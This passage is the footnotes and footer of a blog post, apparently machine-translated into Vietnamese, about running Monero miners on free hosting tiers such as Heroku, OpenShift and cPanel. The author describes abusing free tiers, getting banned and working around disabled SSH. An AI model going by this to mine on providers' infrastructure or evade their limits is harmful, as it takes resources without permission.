id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>mặc dù điều này sẽ phá vỡ nhiều giả định về quyền riêng tư, tôi chắc chắn rằng hầu hết chúng chỉ nhìn vào bên trong bất cứ khi nào có vấn đề liên quan, nhưng đây chỉ là vấn đề đối với thời gian chạy dựa trên vùng chứa, trong khi máy ảo là khá nhiều hộp đen.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>trình khai thác được tích hợp vào nút monero đã thực hiện một số công việc để làm cho nó thân thiện hơn với nền, nhưng việc phân phối xmrig chưa bao giờ tập trung vào tính thân thiện với nền.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>một số nhóm cung cấp các khó khăn khác nhau trên các cổng kết nối khác nhau và có xu hướng điều chỉnh độ khó công việc phù hợp với số lượt chia sẻ của người khai thác đã gửi, nhưng mức độ chi tiết của proxy vẫn thuận tiện hơn, vì nó sẽ ngăn chặn nhóm<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> khóa lại</a> (mặc dù chúng tôi chưa bao giờ thực sự chuyển nhóm).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>thật không vui khi cấu hình đột nhiên xuất hiện và biến mất khỏi hệ thống tệp</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Chúng tôi không nói về<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> giao thức tầng</a> vì chúng tôi chỉ phải giải quyết bất cứ điều gì được triển khai trong<em> cả hai</em> pool và miner ... thường là mức tối thiểu và có thể với các phần mở rộng không chuẩn.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>không bao giờ đi đầy đủ bash :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Tôi chưa khám phá điều gì sẽ xảy ra khi một quy trình tải chức năng bổ sung trong thời gian chạy, vì hạt nhân sẽ tìm kiếm địa chỉ trong bố cục bộ nhớ của tệp thực thi, điều này sẽ truy cập hệ thống tệp và có thể gây ra sự cố.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Giới hạn là tùy ý, thời gian cpu dưới một giây, bộ nhớ nhỏ hơn 128M, kết nối ra bên ngoài bị chặn.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>với một chút kiên nhẫn, bạn cũng có thể chạy một phiên bản ssh đầy đủ trên một môi trường được khởi động xung quanh không gian tài khoản cpanel của bạn,<em> không có</em> có quyền truy cập vào SSH của bản tích hợp cPanel có xu hướng bị vô hiệu hóa bởi các nhà cung cấp dịch vụ lưu trữ.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift đã tăng từ mức miễn phí 1 năm lên 3 tháng đến 1 tháng, bắt đầu yêu cầu xác thực điện thoại, tôi có thể đảm bảo rằng mình không phải là người duy nhất lạm dụng dịch vụ của họ.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Các thùng chứa tầng miễn phí của Heroku khá hào phóng về tài nguyên, chúng cung cấp CPU 4c / 8t (ảo), nhiều ram và dung lượng lưu trữ lớn (tuy nhiên không liên tục và bị loại bỏ khi tắt máy dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Họ ủng hộ các quy tắc đăng ký nghiêm ngặt hơn, sau một vài lệnh cấm, tôi có thể đã đóng góp vào nó.</table><p><div id=post-tags-list>Thẻ bài: <span class=post-tag><a href=https://www.unto.re/tag/crypto> tiền điện tử</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> mạng lưới</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> vỏ bọc</a></span></div><div class=page-foot><div class=copyright>Ngày 21 tháng 8 năm 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© undoreh - Cung cấp bởi<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/vi/sitemapxml> Sơ đồ trang web</a></li> | <li><a href=/vi/tag> Thẻ</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>